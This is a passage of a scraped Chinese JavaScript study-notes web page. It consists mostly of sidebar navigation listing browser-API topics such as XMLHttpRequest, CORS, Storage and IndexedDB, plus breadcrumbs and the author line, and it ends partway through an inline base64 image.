href="/pages/eea84c/#domainï¼Œpath" class="sidebar-link">Domainï¼ŒPath</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#secureï¼Œhttponly" class="sidebar-link">Secureï¼ŒHttpOnly</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#samesite" class="sidebar-link">SameSite</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-document-cookie" class="sidebar-link">4.document.cookie</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#äº”ã€xmlhttprequest-å¯¹è±¡" class="sidebar-link">äº”ã€XMLHttpRequest å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-ç®€ä»‹" class="sidebar-link">1.ç®€ä»‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-xmlhttprequest-çš„å®ä¾‹å±æ€§" class="sidebar-link">2.XMLHttpRequest çš„å®ä¾‹å±æ€§</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-readystate" class="sidebar-link">XMLHttpRequest.readyState</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-onreadystatechange" class="sidebar-link">XMLHttpRequest.onreadystatechange</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-response" class="sidebar-link">XMLHttpRequest.response</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-responsetype" class="sidebar-link">XMLHttpRequest.responseType</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-responsetext" class="sidebar-link">XMLHttpRequest.responseText</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-responsexml" class="sidebar-link">XMLHttpRequest.responseXML</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-responseurl" class="sidebar-link">XMLHttpRequest.responseURL</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-statusï¼Œxmlhttprequest-statustext" class="sidebar-link">XMLHttpRequest.statusï¼ŒXMLHttpRequest.statusText</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-timeoutï¼Œxmlhttprequesteventtarget-ontimeout" class="sidebar-link">XMLHttpRequest.timeoutï¼ŒXMLHttpRequestEventTarget.ontimeout</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#äº‹ä»¶ç›‘å¬å±æ€§" class="sidebar-link">äº‹ä»¶ç›‘å¬å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-withcredentials" class="sidebar-link">XMLHttpRequest.withCredentials</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-upload" class="sidebar-link">XMLHttpRequest.upload</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-xmlhttprequest-çš„å®ä¾‹æ–¹æ³•" class="sidebar-link">3.XMLHttpRequest çš„å®ä¾‹æ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-open" class="sidebar-link">XMLHttpRequest.open()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-send" class="sidebar-link">XMLHttpRequest.send()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-setrequestheader" class="sidebar-link">XMLHttpRequest.setRequestHeader()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-overridemimetype" class="sidebar-link">XMLHttpRequest.overrideMimeType()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-getresponseheader" class="sidebar-link">XMLHttpRequest.getResponseHeader()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-getallresponseheaders" class="sidebar-link">XMLHttpRequest.getAllResponseHeaders()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#xmlhttprequest-abort" class="sidebar-link">XMLHttpRequest.abort()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-xmlhttprequest-å®ä¾‹çš„äº‹ä»¶" class="sidebar-link">4.XMLHttpRequest å®ä¾‹çš„äº‹ä»¶</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#readystatechange-äº‹ä»¶" class="sidebar-link">readyStateChange äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#progress-äº‹ä»¶" class="sidebar-link">progress äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#load-äº‹ä»¶ã€error-äº‹ä»¶ã€abort-äº‹ä»¶" class="sidebar-link">load äº‹ä»¶ã€error äº‹ä»¶ã€abort äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#loadend-äº‹ä»¶" class="sidebar-link">loadend äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#timeout-äº‹ä»¶" class="sidebar-link">timeout äº‹ä»¶</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_5-navigator-sendbeacon" class="sidebar-link">5.Navigator.sendBeacon()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#äº”ã€åŒæºé™åˆ¶" class="sidebar-link">äº”ã€åŒæºé™åˆ¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°-2" class="sidebar-link">1.æ¦‚è¿°</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#å«ä¹‰" class="sidebar-link">å«ä¹‰</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ç›®çš„" class="sidebar-link">ç›®çš„</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#é™åˆ¶èŒƒå›´" class="sidebar-link">é™åˆ¶èŒƒå›´</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-cookie" class="sidebar-link">2.Cookie</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-iframe-å’Œå¤šçª—å£é€šä¿¡" class="sidebar-link">3.iframe å’Œå¤šçª—å£é€šä¿¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#ç‰‡æ®µè¯†åˆ«ç¬¦" class="sidebar-link">ç‰‡æ®µè¯†åˆ«ç¬¦</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-postmessage" class="sidebar-link">window.postMessage()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#localstorage" class="sidebar-link">LocalStorage</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-ajax" class="sidebar-link">4.AJAX</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#jsonp" class="sidebar-link">JSONP</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#websocket" class="sidebar-link">WebSocket</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#cors" class="sidebar-link">CORS</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å…­ã€cors-é€šä¿¡" class="sidebar-link">å…­ã€CORS é€šä¿¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-ç®€ä»‹-2" class="sidebar-link">1.ç®€ä»‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-ä¸¤ç§è¯·æ±‚" class="sidebar-link">2.ä¸¤ç§è¯·æ±‚</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-ç®€å•è¯·æ±‚" class="sidebar-link">3.ç®€å•è¯·æ±‚</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#åŸºæœ¬æµç¨‹" class="sidebar-link">åŸºæœ¬æµç¨‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#withcredentials-å±æ€§" class="sidebar-link">withCredentials å±æ€§</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-éç®€å•è¯·æ±‚" class="sidebar-link">4.éç®€å•è¯·æ±‚</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#é¢„æ£€è¯·æ±‚" class="sidebar-link">é¢„æ£€è¯·æ±‚</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#é¢„æ£€è¯·æ±‚çš„å›åº”" class="sidebar-link">é¢„æ£€è¯·æ±‚çš„å›åº”</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”" class="sidebar-link">æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_5-ä¸-jsonp-çš„æ¯”è¾ƒ" class="sidebar-link">5.ä¸ JSONP çš„æ¯”è¾ƒ</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸ƒã€storage-æ¥å£" class="sidebar-link">ä¸ƒã€Storage æ¥å£</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°-3" class="sidebar-link">1.æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-å±æ€§å’Œæ–¹æ³•" class="sidebar-link">2.å±æ€§å’Œæ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#storage-setitem" class="sidebar-link">Storage.setItem()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#storage-getitem" class="sidebar-link">Storage.getItem()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#storage-removeitem" class="sidebar-link">Storage.removeItem()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#storage-clear" class="sidebar-link">Storage.clear()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#storage-key" class="sidebar-link">Storage.key()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-storage-äº‹ä»¶" class="sidebar-link">3.storage äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å…«ã€history-å¯¹è±¡" class="sidebar-link">å…«ã€History å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°-4" class="sidebar-link">1.æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-å±æ€§" class="sidebar-link">2.å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-æ–¹æ³•" class="sidebar-link">3.æ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#history-back-ã€history-forward-ã€history-go" class="sidebar-link">History.back()ã€History.forward()ã€History.go()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#history-pushstate-ï¼Œ" class="sidebar-link">History.pushState()ï¼Œ</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#history-replacestate" class="sidebar-link">History.replaceState()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-popstate-äº‹ä»¶" class="sidebar-link">4.popstate äº‹ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¹ã€location-å¯¹è±¡ï¼Œurl-å¯¹è±¡ï¼Œurlsearchparams-å¯¹è±¡" class="sidebar-link">ä¹ã€Location å¯¹è±¡ï¼ŒURL å¯¹è±¡ï¼ŒURLSearchParams å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-location-å¯¹è±¡" class="sidebar-link">1.Location å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#å±æ€§" class="sidebar-link">å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ–¹æ³•" class="sidebar-link">æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-url-çš„ç¼–ç å’Œè§£ç " class="sidebar-link">2.URL çš„ç¼–ç å’Œè§£ç </a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#encodeuri" class="sidebar-link">encodeURI()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#encodeuricomponent" class="sidebar-link">encodeURIComponent()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#decodeuri" class="sidebar-link">decodeURI()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#decodeuricomponent" class="sidebar-link">decodeURIComponent()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-url-æ¥å£" class="sidebar-link">3.URL æ¥å£</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ„é€ å‡½æ•°" class="sidebar-link">æ„é€ å‡½æ•°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å®ä¾‹å±æ€§" class="sidebar-link">å®ä¾‹å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#é™æ€æ–¹æ³•" class="sidebar-link">é™æ€æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-urlsearchparams-å¯¹è±¡" class="sidebar-link">4.URLSearchParams å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ¦‚è¿°-2" class="sidebar-link">æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-tostring" class="sidebar-link">URLSearchParams.toString()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-append" class="sidebar-link">URLSearchParams.append()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-delete" class="sidebar-link">URLSearchParams.delete()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-has" class="sidebar-link">URLSearchParams.has()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-set" class="sidebar-link">URLSearchParams.set()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-get-ï¼Œurlsearchparams-getall" class="sidebar-link">URLSearchParams.get()ï¼ŒURLSearchParams.getAll()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-sort" class="sidebar-link">URLSearchParams.sort()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#urlsearchparams-keys-ï¼Œurlsearchparams-values-ï¼Œurlsearchparams-entries" class="sidebar-link">URLSearchParams.keys()ï¼ŒURLSearchParams.values()ï¼ŒURLSearchParams.entries()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åã€arraybuffer-å¯¹è±¡ï¼Œblob-å¯¹è±¡" class="sidebar-link">åã€ArrayBuffer å¯¹è±¡ï¼ŒBlob å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-arraybuffer-å¯¹è±¡" class="sidebar-link">1.ArrayBuffer å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-blob-å¯¹è±¡" class="sidebar-link">2.Blob å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#ç®€ä»‹" class="sidebar-link">ç®€ä»‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•" class="sidebar-link">å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#è·å–æ–‡ä»¶ä¿¡æ¯" class="sidebar-link">è·å–æ–‡ä»¶ä¿¡æ¯</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸‹è½½æ–‡ä»¶" class="sidebar-link">ä¸‹è½½æ–‡ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ç”Ÿæˆ-url" class="sidebar-link">ç”Ÿæˆ URL</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#è¯»å–æ–‡ä»¶" class="sidebar-link">è¯»å–æ–‡ä»¶</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åä¸€ã€file-å¯¹è±¡ï¼Œfilelist-å¯¹è±¡ï¼Œfilereader-å¯¹è±¡" class="sidebar-link">åä¸€ã€File å¯¹è±¡ï¼ŒFileList å¯¹è±¡ï¼ŒFileReader å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-file-å¯¹è±¡" class="sidebar-link">1.File å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ„é€ å‡½æ•°-2" class="sidebar-link">æ„é€ å‡½æ•°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-2" class="sidebar-link">å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-filelist-å¯¹è±¡" class="sidebar-link">2.FileList å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-filereader-å¯¹è±¡" class="sidebar-link">3.FileReader å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åä¸€ã€è¡¨å•ï¼Œformdata-å¯¹è±¡" class="sidebar-link">åä¸€ã€è¡¨å•ï¼ŒFormData å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-è¡¨å•æ¦‚è¿°" class="sidebar-link">1.è¡¨å•æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-formdata-å¯¹è±¡" class="sidebar-link">2.FormData å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ¦‚è¿°-3" class="sidebar-link">æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å®ä¾‹æ–¹æ³•" class="sidebar-link">å®ä¾‹æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-è¡¨å•çš„å†…ç½®éªŒè¯" class="sidebar-link">3.è¡¨å•çš„å†…ç½®éªŒè¯</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#è‡ªåŠ¨æ ¡éªŒ" class="sidebar-link">è‡ªåŠ¨æ ¡éªŒ</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#checkvalidity" class="sidebar-link">checkValidity()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#willvalidate-å±æ€§" class="sidebar-link">willValidate å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#validationmessage-å±æ€§" class="sidebar-link">validationMessage å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#setcustomvalidity" class="sidebar-link">setCustomValidity()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#validity-å±æ€§" class="sidebar-link">validity å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#è¡¨å•çš„-novalidate-å±æ€§" class="sidebar-link">è¡¨å•çš„ novalidate å±æ€§</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-enctype-å±æ€§" class="sidebar-link">4.enctype å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_5-æ–‡ä»¶ä¸Šä¼ " class="sidebar-link">5.æ–‡ä»¶ä¸Šä¼ </a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åäºŒã€indexeddb-api" class="sidebar-link">åäºŒã€IndexedDB API</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°-5" class="sidebar-link">1.æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-åŸºæœ¬æ¦‚å¿µ" class="sidebar-link">2.åŸºæœ¬æ¦‚å¿µ</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-æ“ä½œæµç¨‹" class="sidebar-link">3.æ“ä½œæµç¨‹</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ‰“å¼€æ•°æ®åº“" class="sidebar-link">æ‰“å¼€æ•°æ®åº“</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ–°å»ºæ•°æ®åº“" class="sidebar-link">æ–°å»ºæ•°æ®åº“</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ–°å¢æ•°æ®" class="sidebar-link">æ–°å¢æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#è¯»å–æ•°æ®" class="sidebar-link">è¯»å–æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#éå†æ•°æ®" class="sidebar-link">éå†æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ›´æ–°æ•°æ®" class="sidebar-link">æ›´æ–°æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åˆ é™¤æ•°æ®" class="sidebar-link">åˆ é™¤æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä½¿ç”¨ç´¢å¼•" class="sidebar-link">ä½¿ç”¨ç´¢å¼•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-indexeddb-å¯¹è±¡" class="sidebar-link">4.indexedDB å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#indexeddb-open" class="sidebar-link">indexedDB.open()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#indexeddb-deletedatabase" class="sidebar-link">indexedDB.deleteDatabase()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#indexeddb-cmp" class="sidebar-link">indexedDB.cmp()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_5-idbrequest-å¯¹è±¡" class="sidebar-link">5.IDBRequest å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_6-idbdatabase-å¯¹è±¡" class="sidebar-link">6.IDBDatabase å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#å±æ€§-2" class="sidebar-link">å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ–¹æ³•-2" class="sidebar-link">æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_7-idbobjectstore-å¯¹è±¡" class="sidebar-link">7.IDBObjectStore å¯¹è±¡</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#å±æ€§-3" class="sidebar-link">å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ–¹æ³•-3" class="sidebar-link">æ–¹æ³•</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_8-idbtransaction-å¯¹è±¡" class="sidebar-link">8.IDBTransaction å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_9-idbindex-å¯¹è±¡" class="sidebar-link">9.IDBIndex å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_10-idbcursor-å¯¹è±¡" class="sidebar-link">10.IDBCursor å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_11-idbkeyrange-å¯¹è±¡" class="sidebar-link">11.IDBKeyRange å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åä¸‰ã€web-worker" class="sidebar-link">åä¸‰ã€Web Worker</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°-6" class="sidebar-link">1.æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-åŸºæœ¬ç”¨æ³•" class="sidebar-link">2.åŸºæœ¬ç”¨æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸»çº¿ç¨‹" class="sidebar-link">ä¸»çº¿ç¨‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#worker-çº¿ç¨‹" class="sidebar-link">Worker çº¿ç¨‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#worker-åŠ è½½è„šæœ¬" class="sidebar-link">Worker åŠ è½½è„šæœ¬</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#é”™è¯¯å¤„ç†" class="sidebar-link">é”™è¯¯å¤„ç†</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å…³é—­-worker" class="sidebar-link">å…³é—­ Worker</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-æ•°æ®é€šä¿¡" class="sidebar-link">3.æ•°æ®é€šä¿¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-åŒé¡µé¢çš„-web-worker" class="sidebar-link">4.åŒé¡µé¢çš„ Web Worker</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_5-å®ä¾‹ï¼šworker-çº¿ç¨‹å®Œæˆè½®è¯¢" class="sidebar-link">5.å®ä¾‹ï¼šWorker çº¿ç¨‹å®Œæˆè½®è¯¢</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_6-å®ä¾‹ï¼š-worker-æ–°å»º-worker" class="sidebar-link">6.å®ä¾‹ï¼š Worker æ–°å»º Worker</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_7-api" class="sidebar-link">7.API</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸»çº¿ç¨‹-2" class="sidebar-link">ä¸»çº¿ç¨‹</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#worker-çº¿ç¨‹-2" class="sidebar-link">Worker çº¿ç¨‹</a></li></ul></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>ES6é˜®ä¸€å³°</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>ä½ ä¸çŸ¥é“çš„JavaScript</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper"><div class="articleInfo-wrap" data-v-cd22c674><div class="articleInfo" data-v-cd22c674><ul class="breadcrumbs" data-v-cd22c674><li data-v-cd22c674><a href="/" title="é¦–é¡µ" class="iconfont icon-home router-link-active" data-v-cd22c674></a></li> <li data-v-cd22c674><a href="/categories/?category=%E7%AC%94%E8%AE%B0" title="åˆ†ç±»" data-v-cd22c674>ç¬”è®°</a></li> <li data-v-cd22c674><a href="/categories/?category=Javascript%E9%98%AE%E4%B8%80%E5%B3%B0" title="åˆ†ç±»" data-v-cd22c674>Javascripté˜®ä¸€å³°</a></li></ul> <div class="info" data-v-cd22c674><div title="ä½œè€…" class="author iconfont icon-touxiang" data-v-cd22c674><a href="https://github.com/leefaith" target="_blank" title="ä½œè€…" class="beLink" data-v-cd22c674>Jennifer</a></div> <div title="åˆ›å»ºæ—¶é—´" class="date iconfont icon-riqi" data-v-cd22c674><a href="javascript:;" data-v-cd22c674>2020-06-10</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84L